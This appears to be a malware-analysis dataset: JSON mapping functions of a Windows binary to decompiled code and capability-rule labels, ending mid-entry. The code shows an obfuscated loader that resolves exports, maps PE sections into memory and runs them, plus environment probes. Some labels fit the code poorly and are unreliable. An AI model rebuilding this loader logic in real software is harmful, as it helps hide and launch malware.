{
    "00401000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t fcn.00401000(void)\n\n{\n    int32_t iVar1;\n    uint32_t uStack208;\n    uint auStack188 [2];\n    uint uStack180;\n    uchar auStack172 [52];\n    uint uStack120;\n    int32_t iStack116;\n    int32_t iStack96;\n    int32_t iStack92;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    int32_t iStack44;\n    uint uStack36;\n    uint32_t uStack20;\n    int16_t iStack14;\n    uint var_4h;\n    \n    // [00] -r-x section size 16384 named .text\n    uStack20 = 0x3f036c90;\n    iStack44 = 0;\n    uStack48 = 0x297dca1d;\n    uStack52 = 0;\n    fcn.00401a40(auStack188);\n    uStack120 = auStack188[0];\n    fcn.00401230(auStack172);\n    iStack96 = fcn.00402e10(0);\n    if ((iStack96 == 0) &&\n       (uStack36 = 0x60582286, \n       (uStack48 + 0xe18d16d0 ^ uStack48 + 0x2aca863a |\n       iStack44 + -1 + (0x1e72e92f < uStack48) ^ iStack44 + (0xd53579c5 < uStack48)) != 0)) {\n        uStack208 = uStack20 ^ 0xc0fc9354;\n    }\n    else if (iStack96 == 1) {\n        uStack208 = 0x3f036c40 - uStack20;\n    }\n    else {\n        iVar1 = fcn.00401810(iStack96);\n        iStack92 = *(iVar1 + 0x50);\n        iStack116 = *0x4063d0 - (uStack20 + 0xc1260316);\n        iStack14 = iStack14 + 0x6586;\n        if (iStack92 == 0x3f036c90 - uStack20) {\n            uStack208 = 0x3f036c4a - uStack20;\n        }\n        else {\n            iVar1 = fcn.004016c0(auStack172, uStack180);\n            iStack14 = iStack14 * 2;\n            if (iVar1 == 0) {\n                uStack208 = uStack20 ^ 0xc0fc935e;\n            }\n            else {\n                uStack52 = uStack20 ^ 0x3f036c91;\n                uStack208 = fcn.004015f0(iVar1, auStack172);\n            }\n        }\n    }\n    return uStack208;\n}\n",
        "token_count": 640
    },
    "004013a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.004013a0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uStack80;\n    uint uStack40;\n    uint var_bp_ch;\n    \n    if (arg_ch == 0) {\n        uStack80 = *0x4063c4;\n    }\n    else {\n        uStack80 = *0x4063c0;\n    }\n    if (*0x4063bc == NULL) {\n        uStack40 = 0;\n    }\n    else {\n        uStack40 = (**0x4063bc)(0, arg_8h, *0x4063b4 + -0x20444f, uStack80, 0xffffffff, 0x99a0f2db, 0);\n    }\n    return uStack40;\n}\n",
        "token_count": 190
    },
    "004015f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_6h\n\nbool __cdecl fcn.004015f0(code *arg_8h, uint arg_ch)\n\n{\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_6h;\n    \n    if (arg_8h != NULL) {\n        (*arg_8h)(arg_ch);\n    }\n    return arg_8h != NULL;\n}\n",
        "token_count": 127
    },
    "004016c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nint32_t __cdecl fcn.004016c0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iStack72;\n    uchar auStack61 [29];\n    uint32_t uStack32;\n    uint uStack28;\n    int32_t iStack24;\n    uint var_bp_8h;\n    \n    iStack24 = 0x3e45a448;\n    fcn.00401db0(auStack61, 0x405589, 0xe);\n    *0x4063bc = fcn.00403530(auStack61);\n    uStack32 = uStack32 & 0x7e412d6a;\n    uStack28 = 0;\n    iStack72 = fcn.004013a0(*0x4063b8 - (iStack24 + -0x3de81bb8), iStack24 + -0x3e45a447);\n    if (iStack72 == 0) {\n        iStack72 = 0;\n    }\n    else {\n        *(arg_8h + 0x58) = iStack72 - *0x4063c8;\n        fcn.00401860();\n        *(arg_8h + 0x54) = iStack72;\n        fcn.00402e90(iStack72, arg_ch);\n        iStack72 = *0x4063cc + iStack72;\n    }\n    return iStack72;\n}\n",
        "token_count": 334
    },
    "00402e10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_6h\n\nuint __cdecl fcn.00402e10(int32_t arg_8h)\n\n{\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_eh;\n    uint var_6h;\n    \n    if (arg_8h == 0) {\n        *NULL = fcn.00402ca0();\n    }\n    else {\n        *NULL = fcn.00403e70(arg_8h, 0);\n    }\n    return stack0xfffffff0;\n}\n",
        "token_count": 130
    },
    "00402e90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.00402e90(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iStack60;\n    uint32_t uStack56;\n    uint var_8h;\n    \n    if ((arg_8h != 0) && (arg_ch != 0)) {\n        iVar1 = fcn.00401810(arg_ch);\n        iStack60 = iVar1 + 0x18 + *(iVar1 + 0x14);\n        for (uStack56 = 0; uStack56 < *(iVar1 + 6); uStack56 = uStack56 + 1) {\n            fcn.004019a0(arg_8h, arg_ch, iStack60, uStack56, *(iVar1 + 0x54));\n            iStack60 = iStack60 + 0x28;\n        }\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "00403110": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00403110(uint arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint uStack140;\n    uint uStack136;\n    uchar auStack132 [36];\n    uint32_t uStack96;\n    uint32_t uStack92;\n    uint16_t uStack88;\n    uint16_t uStack86;\n    int32_t iStack84;\n    int32_t iStack60;\n    int16_t iStack54;\n    uint uStack48;\n    uint uStack44;\n    uint8_t uStack35;\n    uint32_t uStack32;\n    int32_t iStack28;\n    uint var_ch;\n    \n    uVar1 = uStack35;\n    iStack28 = 0;\n    uStack32 = 0x2b1c72fe;\n    uStack35 = uStack35 * -0x39;\n    iStack54 = -0x6e27;\n    iStack60 = 0x725ad6c2;\n    uStack96 = 0x768499cd;\n    uStack92 = 0;\n    if (arg_ch == 0) goto code_r0x0040326b;\n    do {\n        fcn.00401db0(auStack132, 0x405571, iStack60 + -0x725ad6aa);\n        if (arg_ch != 0) {\n            *0x4063b0 = fcn.00403980(auStack132);\n            if (*0x4063b0 == NULL) {\n                uStack136 = 0;\n            }\n            else {\n                uStack35 = uVar1 ^ 0xbd;\n                iStack84 = arg_ch;\n                uVar2 = 0x725ad6c2 - iStack60;\n                uStack88 = fcn.004017d0(arg_ch);\n                if (uStack88 == uVar2) {\n                    uStack136 = 0;\n                }\n                else {\n                    uStack48 = 0x2d0055e8;\n                    uStack44 = 0;\n                    uStack140 = 0;\n                    uStack86 = uStack88;\n                    (**0x4063b0)(arg_8h, &uStack88, iStack54 + 0x6e27, &uStack140);\n                    uStack136 = uStack140;\n                }\n            }\n            goto code_r0x004031fe;\n        }\n        uStack35 = uVar1 + 100;\n    } while ((uStack96 ^ 0x5ece9298 - uStack32 | uStack92 ^ -(0x5ece9298 < uStack32) - iStack28) == 0);\n    uStack136 = 0;\ncode_r0x004031fe:\n    while ((uStack32 + 0x9540227 ^ 0x5edff412 - uStack32 |\n           iStack28 + (0xf6abfdd8 < uStack32) ^ -(0x5edff412 < uStack32) - iStack28) == 0) {\ncode_r0x0040326b:\n        uStack136 = 0;\n    }\n    return uStack136;\n}\n",
        "token_count": 717
    },
    "00403530": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403530(int32_t arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_ch;\n    uint var_8h;\n    uint var_bp_4h;\n    \n    if (arg_8h == 0) {\n        var_bp_4h = 0;\n    }\n    else {\n        arg_8h_00 = fcn.00401860();\n        var_bp_4h = fcn.00403110(arg_8h_00, arg_8h);\n    }\n    return var_bp_4h;\n}\n",
        "token_count": 127
    },
    "00403e70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x004040f4)\n// WARNING: Removing unreachable block (ram,0x00403ee2)\n// WARNING: Removing unreachable block (ram,0x00403f65)\n\nuint * __cdecl fcn.00403e70(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    bool bVar6;\n    uint32_t uStack104;\n    uint *puStack76;\n    uint var_bp_ch;\n    \n    iVar4 = fcn.00401960();\n    puVar5 = *(iVar4 + 0xc) + 0x14;\n    puStack76 = *puVar5;\n    do {\n        if (puStack76 == puVar5) {\n            return NULL;\n        }\n        uVar1 = *(puStack76 + 9);\n        iVar4 = puStack76[10];\n        if ((puStack76[4] == arg_ch) && (arg_ch != 0)) {\n            return puStack76 + -2;\n        }\n        bVar6 = false;\n        if (arg_8h != 0) {\n            for (uStack104 = 0; uStack104 < uVar1 / 2; uStack104 = uStack104 + 1) {\n                iVar2 = fcn.00402580(*(iVar4 + uStack104 * 2));\n                iVar3 = fcn.00402580(*(arg_8h + uStack104 * 2));\n                bVar6 = iVar3 == iVar2;\n                if ((iVar2 == 0) || (!bVar6)) break;\n            }\n        }\n        if (bVar6) {\n            return puStack76[4];\n        }\n        puStack76 = *puStack76;\n    } while( true );\n}\n",
        "token_count": 434
    },
    "00402000": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00402000(void)\n\n{\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    (*_sym.imp.KERNEL32.dll_GetTickCount64)();\n    (*_sym.imp.KERNEL32.dll_GetTimeZoneInformation)(&var_b4h);\n    (*_sym.imp.KERNEL32.dll_GetUserDefaultUILanguage)();\n    return;\n}\n",
        "token_count": 134
    },
    "00402360": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00402360(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    int32_t iStack180;\n    uchar *puStack176;\n    uchar *puStack172;\n    uint uStack168;\n    uint uStack164;\n    uint32_t uStack160;\n    uint uStack148;\n    uint uStack140;\n    uint uStack128;\n    char cStack121;\n    int32_t iStack120;\n    uchar *puStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    int32_t iStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uint uStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    uchar auStack72 [20];\n    uint32_t uStack52;\n    uint32_t uStack48;\n    int32_t iStack44;\n    char cStack33;\n    uint var_ch;\n    \n    cStack33 = '\\x14';\n    iStack44 = 0;\n    uStack48 = 0x361d47d5;\n    uStack52 = 0x233d774d;\n    for (iStack76 = 0; puStack112 = &stack0xffffff40,  iStack76 != 0x233d7758 - uStack52;\n        iStack76 = iStack76 + (0x233d774e - uStack52)) {\n        puStack104 = &stack0xffffffb8;\n        cStack121 = cStack33 + -0xc;\n        iStack184 = 0x23f59717 - uStack52;\n        iStack180 = uStack52 + 0xdcc28b1a;\n        uStack84 = 0xccfb46;\n        iStack188 = uStack52 + 0xdcc28bfa;\n        iStack80 = uStack52 + 0xdd9dbb03;\n        uStack192 = uStack52 ^ 0x2398fc41;\n        uStack92 = uStack48;\n        iStack96 = iStack44;\n        uStack100 = 0;\n        iStack108 = 0x36bf17ee - uStack48;\n        iStack120 = -(0x36bf17ee < uStack48) - iStack44;\n        puStack116 = &stack0xffffffb0;\n        iStack88 = iStack188;\n        puStack176 = puStack116;\n        uStack148 = (*_sym.imp.ADVAPI32.dll_CryptDeriveKey)();\n        iStack88 = uStack140;\n        uStack92 = uStack128;\n        uStack160 = (*_sym.imp.KERNEL32.dll_QueryProcessCycleTime)(0xccfb46, &stack0xffffffa4);\n        uStack164 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n        puStack172 = &stack0xffffffa8;\n        uStack168 = 0x675663;\n        iStack184 = (*_sym.imp.GDI32.dll_GetDCOrgEx)(0x675663, &stack0xffffffa8);\n        uVar1 = (*_sym.imp.KERNEL32.dll_Wow64EnableWow64FsRedirection)(uStack160 >> 0x18);\n        uStack192 = uStack192 & 0xffffff | uVar1 << 0x18;\n        (*_sym.imp.OLEAUT32.dll_VariantInit)(L\"2X>Bu-G!EFx\");\n        uStack164 = (*_sym.imp.GDI32.dll_GetPolyFillMode)(0x1f1a96);\n        iStack188 = 0x481211;\n        uStack192 = 0x402574;\n        puStack172 = sub.USER32.dll_DdeUnaccessData();\n    }\n    return;\n}\n",
        "token_count": 862
    },
    "00402710": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00402710(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uStack116;\n    uint32_t uStack76;\n    uint32_t uStack60;\n    uint uStack56;\n    uint32_t uStack48;\n    char cStack41;\n    uint32_t uStack40;\n    int32_t iStack36;\n    int16_t iStack28;\n    uint var_4h;\n    \n    iStack28 = 0x2ca2;\n    iStack36 = 0;\n    uStack40 = 0x3cc43b87;\n    cStack41 = '3';\n    uStack48 = 0x528e4874;\n    fcn.00402000();\n    iVar1 = fcn.00402fd0(_sym.imp.KERNEL32.dll_CloseHandle);\n    if (iVar1 == uStack48 + 0xad71b78c) {\n        uStack56 = uStack56 & 0xffff | iStack28 + 0xec77U << 0x10;\n        if (iStack28 + 0xec77U <= iStack28 + 0x9f66U) {\n            uStack60 = uStack48 + 0xad71b78c;\n            (*_sym.imp.ADVAPI32.dll_IsValidSecurityDescriptor)(0);\n            for (; uStack60 != (uStack48 ^ 0x528e48c0); uStack60 = uStack60 + (uStack48 ^ 0x528e4875)) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)();\n                (*_sym.imp.KERNEL32.dll_GetThreadPriority)(uVar2);\n                uStack56 = uStack116;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n                (*_sym.imp.KERNEL32.dll_GetProcessPriorityBoost)(uVar2, &uStack56);\n            }\n            do {\n                uVar2 = fcn.00404140(uStack48 + 0xad71b78c);\n                iVar3 = uStack48 + 0xad71b78c;\n                iVar1 = fcn.00402080(uVar2);\n                if (iVar1 != iVar3) goto code_r0x00402809;\n                uVar5 = iStack36 + (0xd0f16e64 < uStack40);\n                uVar4 = -(0x8bf1d263 < uStack40) - iStack36;\n            } while (uVar5 < uVar4 || uVar5 - uVar4 < (uStack40 + 0x2f0e919b < 0x8bf1d263 - uStack40));\n            uStack76 = uStack48 + 0xad71b78c;\n        }\n    }\n    else {\n        uStack56._0_2_ = CONCAT11(cStack41 + ']', uStack56);\n        uStack56 = uStack56 & 0xffff0000 | uStack56;\n        uStack56._1_1_ = uStack56 >> 8;\n        if (uStack56._1_1_ < 0x2bU - cStack41) {\n            uStack76 = uStack48 ^ 0x528e4875;\n            fcn.00402360();\n        }\n        else {\ncode_r0x00402809:\n            uStack76 = uStack48 + 0xad71b78d;\n        }\n    }\n    return uStack76;\n}\n",
        "token_count": 809
    },
    "00402ca0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402dd9)\n// WARNING: Removing unreachable block (ram,0x00402ce9)\n\nint16_t * fcn.00402ca0(void)\n\n{\n    uint32_t *puVar1;\n    uint var_38h;\n    uint var_32h;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_16h;\n    uint var_10h;\n    \n    var_24h = fcn.00402ca0;\n    do {\n        if (*var_24h == 0x5a4d) {\n            puVar1 = var_24h + *(var_24h + 0x3c);\n            if (((*puVar1 & 0xff) == 0x50) && ((*puVar1 & 0xff) + (*puVar1 >> 8 & 0xff) == 0x95)) {\n                return var_24h;\n            }\n        }\n        var_24h = var_24h + -0x1000 & 0xfffff000;\n    } while( true );\n}\n",
        "token_count": 266
    },
    "00403980": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00403e4f)\n\nint32_t __cdecl fcn.00403980(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    bool bVar6;\n    uint uVar7;\n    uint uVar8;\n    uint32_t uStack156;\n    int32_t iStack140;\n    uint16_t *puStack128;\n    uint32_t uStack116;\n    uint32_t uStack96;\n    uint var_ch;\n    \n    uVar5 = 0xedde19a7;\n    uVar4 = 0xffffffff;\n    uVar7 = 0;\n    uVar8 = 0;\n    uVar1 = fcn.00403530(0);\n    iStack140 = fcn.004034a0(uVar7, uVar4, uVar5, uVar1, uVar8);\n    iVar2 = fcn.00401810(iStack140);\n    uStack156 = 0xffffffff;\n    iVar2 = iStack140 + *(iVar2 + 0x78);\n    puStack128 = iStack140 + *(iVar2 + 0x24);\n    uStack116 = 0;\n    do {\n        if (*(iVar2 + 0x18) <= uStack116) {\ncode_r0x00403b85:\n            if (uStack156 == 0xffffffff) {\n                iStack140 = 0;\n            }\n            else {\n                iStack140 = iStack140 + *(iStack140 + *(iVar2 + 0x1c) + uStack156 * 4);\n            }\n            return iStack140;\n        }\n        iVar3 = iStack140 + *(iStack140 + *(iVar2 + 0x20) + uStack116 * 4);\n        bVar6 = false;\n        for (uStack96 = 0;\n            (((uStack96 < 0x20 && (bVar6 = *(iVar3 + uStack96) == *(arg_8h + uStack96),  *(iVar3 + uStack96) != '\\0'))\n             && (*(arg_8h + uStack96) != '\\0')) && (bVar6)); uStack96 = uStack96 + 1) {\n        }\n        if (bVar6) {\n            uStack156 = *puStack128;\n            goto code_r0x00403b85;\n        }\n        puStack128 = puStack128 + 1;\n        uStack116 = uStack116 + 1;\n    } while( true );\n}\n",
        "token_count": 588
    },
    "00402fd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n// WARNING: Removing unreachable block (ram,0x0040303a)\n\nuint __cdecl fcn.00402fd0(char *arg_8h)\n\n{\n    uint uStack44;\n    uint var_bp_8h;\n    \n    if (((*arg_8h == -0x48) && (arg_8h[3] == 'P')) && (arg_8h[4] == -0x33)) {\n        uStack44 = 1;\n    }\n    else if ((*arg_8h == -1) && (arg_8h[1] == '%')) {\n        uStack44 = fcn.00402fd0(**(arg_8h + 2));\n    }\n    else {\n        uStack44 = 0;\n    }\n    return uStack44;\n}\n",
        "token_count": 189
    },
    "004012b0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n// WARNING: Removing unreachable block (ram,0x00401393)\n\nint32_t __cdecl fcn.004012b0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iStack48;\n    uint var_bp_8h;\n    \n    for (iStack48 = 0; iStack48 != arg_10h; iStack48 = iStack48 + 1) {\n        *(arg_8h + iStack48) = *(arg_ch + iStack48);\n    }\n    return arg_8h;\n}\n",
        "token_count": 146
    },
    "00401510": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.00401510(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_bp_ch;\n    \n    *(arg_8h + arg_10h) = (*(arg_ch + arg_10h) - arg_14h) + -1;\n    return;\n}\n",
        "token_count": 97
    },
    "004019a0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004019a0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    \n    if (arg_14h == 0) {\n        fcn.004012b0(arg_8h, arg_ch, arg_18h);\n    }\n    fcn.004012b0(arg_8h + *(arg_10h + 0xc), arg_ch + *(arg_10h + 0x14), *(arg_10h + 0x10));\n    return;\n}\n",
        "token_count": 185
    },
    "00401230": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401230(int32_t arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    *(arg_8h + 0x6c) = *0x40639c;\n    *(arg_8h + 0x70) = *0x4063a0;\n    *(arg_8h + 0x74) = *0x4063a4;\n    *(arg_8h + 0x68) = *0x4063a8;\n    *(arg_8h + 100) = *0x4063ac;\n    return;\n}\n",
        "token_count": 152
    },
    "00401810": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00401810(int32_t arg_8h)\n\n{\n    uint var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_10h = *(arg_8h + 0x3c) + arg_8h;\n    if (*var_10h != 0x4550) {\n        var_10h = NULL;\n    }\n    return var_10h;\n}\n",
        "token_count": 116
    },
    "00401860": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00401860(void)\n\n{\n    int32_t iStack144;\n    int16_t aiStack136 [32];\n    char acStack72 [32];\n    int32_t iStack40;\n    int16_t iStack36;\n    int16_t iStack34;\n    uint32_t uStack32;\n    uint uStack28;\n    uint var_ch;\n    \n    iStack34 = 0x7749;\n    iStack40 = 0x461e8fe4;\n    fcn.00401db0(acStack72, 0x405563, 0xe);\n    for (iStack144 = iStack40 + -0x461e8fe4; iStack144 != 0x461e9004 - iStack40;\n        iStack144 = iStack144 + iStack40 + -0x461e8fe3) {\n        do {\n            uStack32 = uStack32 & 0x4b8468b3;\n            uStack28 = 0;\n            iStack36 = iStack36 * 0x4c79;\n        } while (iStack34 + -0x3173 == -0x4ac7 - iStack34);\n        aiStack136[iStack144] = acStack72[iStack144];\n    }\n    fcn.00402e10(aiStack136);\n    return;\n}\n",
        "token_count": 306
    },
    "00401a40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Removing unreachable block (ram,0x00401aa4)\n\nint32_t __cdecl fcn.00401a40(uint arg_8h)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iStack132;\n    int32_t iStack124;\n    int32_t iStack120;\n    uchar auStack104 [32];\n    int32_t iStack72;\n    uint32_t uStack68;\n    uchar uStack61;\n    int32_t iStack60;\n    uint uStack56;\n    int32_t iStack52;\n    int32_t iStack48;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uchar uStack33;\n    uint32_t uStack32;\n    int32_t iStack28;\n    uchar uStack19;\n    ushort uStack18;\n    uint var_8h;\n    \n    uStack19 = 0xf3;\n    uStack40 = 0x1cf54fbf;\n    iStack48 = 0x2a267421;\n    uStack61 = 0xb2;\n    iStack132 = 0;\n    uStack56 = arg_8h;\n    iStack124 = 0;\n    iVar3 = fcn.00402320();\n    for (uStack68 = 0; uStack68 < (uStack40 ^ 0x1cf54fba); uStack68 = uStack68 + (0x1cf54fc0 - uStack40)) {\n        iVar2 = *(iVar3 + uStack68 * 0x9c + 0x4c);\n        iStack52 = iVar2 - *(iVar3 + uStack68 * 0x9c + 0x2c);\n        if (0x5eb3a6bc - uStack40 == iStack48) goto code_r0x00401c39;\n        iStack124 = iStack52 + iStack124;\n    }\n    fcn.00401db0(auStack104, 0x405589, uStack40 + 0xe30ab04f);\n    iVar2 = 0x1cf54fbf - uStack40;\n    *0x4063bc = fcn.00403530(auStack104);\n    uStack44 = 0x1cf54fbf - uStack40;\n    iStack120 = fcn.004013a0(iStack124, iVar2);\n    for (; iVar2 = iStack52,  uStack44 < 0x1cf54fc4 - uStack40; uStack44 = uStack44 + uStack40 + 0xe30ab042) {\n        uStack33 = 0;\n        iStack60 = *(uStack44 * 0x9c + iVar3 + 0x2c);\n        iStack72 = *(uStack44 * 0x9c + iVar3 + 0x4c) - iStack60;\n        uStack18 = 0xdde4;\n        fcn.004012b0(iStack120 + iStack132, *(uStack44 * 0x9c + iVar3 + 0x90), iStack72);\n        iStack132 = iStack72 + iStack132;\n        uStack18 = 0x224c;\n    }\ncode_r0x00401c39:\n    iStack52 = iVar2;\n    fcn.00402940(iStack120, iStack120, iStack124);\n    uVar1 = uStack32;\n    uStack32 = uVar1 * 0x49fcd6e9;\n    iStack28 = (uVar1 * 0x49fcd6e9 >> 0x20) + iStack28 * 0x49fcd6e9;\n    iVar3 = 0x1cf54fbf - uStack40;\n    fcn.00402190(iStack120, uStack56);\n    return iVar3;\n}\n",
        "token_count": 880
    },
    "00401ee0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
